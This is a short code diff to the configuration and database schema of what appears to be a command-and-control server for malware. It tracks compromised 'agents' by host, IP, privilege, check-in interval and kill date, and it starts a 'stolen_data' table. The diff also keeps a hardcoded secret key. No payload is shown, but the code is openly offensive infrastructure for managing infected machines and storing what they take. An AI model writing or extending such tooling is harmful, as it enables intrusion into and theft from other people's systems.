@@ -1,5 +1,5 @@
 ﻿import os
-import sqlite3
+import sqlite3, secrets
 
 
 class Config:
@@ -12,8 +12,9 @@ class Config:
         self.upload_folder = "uploads"
         self.screenshot_folder = "screenshots"
         self.max_content_length = 16 * 1024 * 1024  # 16MB
-        self.secret_key = "mQsjJsMfsW43sdzPf9L2Sr78"#os.urandom(24)
-        self.version = "1.4.3"
+        self.secret_key = "mQsjJsMfsW43sdzPf9L2Sr78"
+        self.version = "1.4.5"
+        self.monitor_token = secrets.token_urlsafe(32)  
 
         
        
@@ -30,17 +31,19 @@ class Config:
         c = conn.cursor()
         
         c.execute('''
-        CREATE TABLE IF NOT EXISTS agents (
-            id TEXT PRIMARY KEY,
-            hostname TEXT,
-            ip TEXT,
-            os TEXT,
-            last_seen TEXT,
-            status TEXT,
-            privilege TEXT,
-            ws_connected INTEGER DEFAULT 0
-        )
-    ''')
+            CREATE TABLE IF NOT EXISTS agents (
+                id TEXT PRIMARY KEY,
+                hostname TEXT,
+                ip TEXT,
+                os TEXT,
+                last_seen TEXT,
+                status TEXT,
+                privilege TEXT,
+                ws_connected INTEGER DEFAULT 0,
+                killdate TEXT DEFAULT NULL,
+                checkin_interval INTEGER DEFAULT 10
+            )
+        ''')
         
         c.execute('''
             CREATE TABLE IF NOT EXISTS stolen_data (
